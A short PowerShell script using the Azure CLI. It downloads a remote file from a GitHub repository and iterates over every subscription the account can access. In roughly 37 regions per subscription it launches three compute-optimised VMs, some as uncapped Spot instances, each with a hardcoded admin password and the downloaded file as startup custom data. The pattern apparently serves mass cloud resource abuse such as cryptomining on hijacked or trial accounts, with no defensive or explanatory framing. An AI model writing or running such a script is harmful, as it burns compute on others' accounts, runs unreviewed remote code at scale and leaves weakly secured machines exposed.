Invoke-WebRequest -Uri https://raw.githubusercontent.com/trangtrau/random-agent-spoofer/master/zep.txt -OutFile van.txt
$checksup = az account list --query "[].id" -o tsv		
$listsup = @($checksup )		
foreach ($idsup in $listsup)		
{		
az account set --subscription $idsup		
az group create --name Anvu --location EastUs
$list="eastus","eastus2","westus","centralus","northcentralus","southcentralus","northeurope","westeurope","eastasia","southeastasia","japaneast","japanwest","australiaeast","australiasoutheast","australiacentral","brazilsouth","southindia","centralindia","westindia","canadacentral","canadaeast","westus2","westcentralus","uksouth","ukwest","koreacentral","koreasouth","francecentral","southafricanorth","uaenorth","switzerlandnorth","germanywestcentral","norwayeast","jioindiawest","westus3","swedencentral","qatarcentral"
foreach ($local in $list)
{
az vm create --resource-group Anvu --name ms1a$(Get-Random) --location $local --image Canonical:0001-com-ubuntu-server-focal:20_04-lts-gen2:20.04.202204190  --size Standard_F8s_v2 --admin-username  adminuser --admin-password Kh@nh29101990  --custom-data van.txt --no-wait  
az vm create --resource-group Anvu --name ms1a$(Get-Random) --location $local --image Canonical:0001-com-ubuntu-server-focal:20_04-lts-gen2:20.04.202204190  --size Standard_F2s_v2 --admin-username  adminuser --admin-password Kh@nh29101990  --custom-data van.txt --no-wait  
az vm create --resource-group Anvu --name ms1a$(Get-Random) --location $local --image Canonical:0001-com-ubuntu-server-focal:20_04-lts-gen2:20.04.202204190  --size Standard_F2s_v2 --priority Spot  --max-price -1 --admin-username  adminuser --admin-password Kh@nh29101990  --custom-data van.txt --no-wait  

}
}

